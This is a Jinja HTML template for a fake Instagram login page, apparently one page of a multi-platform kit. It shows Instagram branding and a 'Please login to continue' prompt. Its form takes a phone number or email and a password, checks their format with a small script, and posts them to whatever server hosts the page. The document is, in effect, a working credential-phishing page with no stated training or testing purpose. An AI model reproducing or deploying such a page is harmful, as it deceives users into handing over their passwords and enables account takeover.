{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;transition:none;transform:none;">
  <div class="platform-header">
    <div class="icon-circle bg-instagram"><i class="fa-brands fa-instagram icon-lg"></i></div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram</h2>
      <div style="color:#64748b;font-size:13px">Please login to continue</div>
    </div>
  </div>

  <form id="loginForm" method="post" novalidate>
    <input class="input" id="address" name="address" placeholder="Mobile number or email address" required style="margin-bottom:8px;">
    <input class="input" id="password" name="password" type="password" placeholder="Password" required style="margin-bottom:8px;">
    
    <div id="warning" style="display:none;color:#dc2626;font-size:13px;margin:4px 0 8px;text-align:center;">
      ⚠️ Please enter a valid email or phone number and password.
    </div>

    <div class="center" style="margin-top:6px;">
      <button class="btn btn-blue" type="submit"
        style="width:100%;padding:12px 0;border-radius:999px;font-size:15px;
        background:linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4);
        border:none;color:#fff;box-shadow:0 6px 20px rgba(221,42,123,0.25);transition:background 0.3s ease;">
        Log in
      </button>
    </div>
  </form>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
  const address = document.getElementById("address").value.trim();
  const password = document.getElementById("password").value.trim();
  const warning = document.getElementById("warning");

  const emailRegex = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/;
  const phoneRegex = /^\+?\d{6,}$/;

  if ((!emailRegex.test(address) && !phoneRegex.test(address)) || password.length < 6) {
    e.preventDefault();
    warning.style.display = "block";
  } else {
    warning.style.display = "none";
  }
});
</script>
{% endblock %}
